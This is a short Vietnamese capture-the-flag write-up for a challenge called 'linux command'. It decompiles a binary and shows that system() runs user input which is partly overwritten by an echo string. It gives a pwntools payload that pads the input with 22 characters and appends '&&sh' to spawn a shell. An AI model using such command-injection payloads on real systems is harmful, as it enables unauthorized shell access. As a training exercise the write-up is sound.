### Write up linux command

Mở binary lên bằng ida thấy rằng biến command đc thực thi bởi system()


```C++
 system(command);
```




mà ta có thể nhập dữ liệu cho command thông qua
 
```C++
 __isoc99_scanf("%31s", command);
```
mà thấy rằng 

```C++
  qmemcpy(command, "echo \"Welcome to KCSC\"", 22);
```


tức là chỉ có 22 ký tự được đưa vào biến command trong tổng số 32 ký tự, 22 kí tự đó chính là câu lệnh 
```    
"echo \"Welcome to KCSC\""
```

vì có tận 32 được nhập vào, tức là e sẽ phải để 22 ký tự trước đó là chữ gì đó để khi chương trình chạy, câu lệnh có 22 ký tự trên
sẽ đè lên và tiếp theo sẽ là chuỗi ký tự mà chúng ta mong muốn, e sẽ chọn chỗi &&sh đằng sau để nó thực thi shell để truy cập vào hệ thống
  
   ```c++
 char command[32]; // [rsp+0h] [rbp-20h] BYREF
```

```python
payload = b'A'*22 + b'&&sh'
p.sendlineafter(b'What is your name:',payload)
 ```


khi chạy script thì shell được thực thi


![image](https://github.com/antkss/writeUP/assets/88892713/4b027d20-55f3-461d-8dbd-baf8dcd3b2a2)



